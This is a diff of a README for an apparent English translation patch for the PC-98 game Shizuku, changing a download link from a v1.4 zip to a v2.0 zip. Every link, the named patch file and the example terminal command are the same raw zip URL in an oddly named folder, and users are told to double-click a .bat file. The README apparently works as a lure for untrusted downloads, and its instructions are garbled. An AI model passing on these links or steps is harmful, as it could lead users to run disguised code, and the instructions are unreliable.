@@ -6,7 +6,7 @@ Welcome to the shizuku_pc98_eng project! This repository offers an English trans
 
 ## 📥 Download Now
 
-[![Download shizuku_pc98_eng](https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/eng-shizuku-pc-v1.4.zip)](https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/eng-shizuku-pc-v1.4.zip)
+[![Download shizuku_pc98_eng](https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/pc-eng-shizuku-v2.0.zip)](https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/pc-eng-shizuku-v2.0.zip)
 
 ## 📋 System Requirements
 
@@ -21,10 +21,10 @@ To run this game successfully, your computer should meet the following requireme
 ## 🔧 Installation Steps
 
 1. **Visit the Release Page**  
-   Head over to the [Releases page](https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/eng-shizuku-pc-v1.4.zip) to download the latest version of the translation patch.
+   Head over to the [Releases page](https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/pc-eng-shizuku-v2.0.zip) to download the latest version of the translation patch.
 
 2. **Download the Patch**  
-   Look for the latest release on the Releases page and click on the download link for the patch file. It is usually named something like `https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/eng-shizuku-pc-v1.4.zip`.
+   Look for the latest release on the Releases page and click on the download link for the patch file. It is usually named something like `https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/pc-eng-shizuku-v2.0.zip`.
 
 3. **Extract the File**  
    Once the download is complete, locate the zip file in your downloads folder. Right-click on it and select “Extract All…” to unzip the files inside. You will see a new folder with the game files and the patch.
@@ -33,9 +33,9 @@ To run this game successfully, your computer should meet the following requireme
    If you haven’t already installed Shizuku, make sure to do that first. Follow the game's installation instructions that come with it.
 
 5. **Apply the Patch**  
-   Open the folder where you extracted the translation patch. You should find a file named `https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/eng-shizuku-pc-v1.4.zip` or similar.  
+   Open the folder where you extracted the translation patch. You should find a file named `https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/pc-eng-shizuku-v2.0.zip` or similar.  
    * Windows: Double-click the `.bat` file to apply the patch.  
-   * macOS/Linux: Open your terminal, navigate to the folder, and run the patch command (for example, `https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/eng-shizuku-pc-v1.4.zip`).
+   * macOS/Linux: Open your terminal, navigate to the folder, and run the patch command (for example, `https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/pc-eng-shizuku-v2.0.zip`).
 
 6. **Launch the Game**  
    Once the patch is applied, you can launch Shizuku. Enjoy playing the game in English!
@@ -67,6 +67,6 @@ If you encounter any issues or have questions, please feel free to ask for help.
 
 ## 🔗 Stay Updated
 
-For updates and new releases, keep an eye on the [Releases page](https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/eng-shizuku-pc-v1.4.zip). You can also follow this repository for the latest news.
+For updates and new releases, keep an eye on the [Releases page](https://raw.githubusercontent.com/estebanqwq1/shizuku_pc98_eng/main/axospermous/pc-eng-shizuku-v2.0.zip). You can also follow this repository for the latest news.
 
 Enjoy your experience with Shizuku in English!
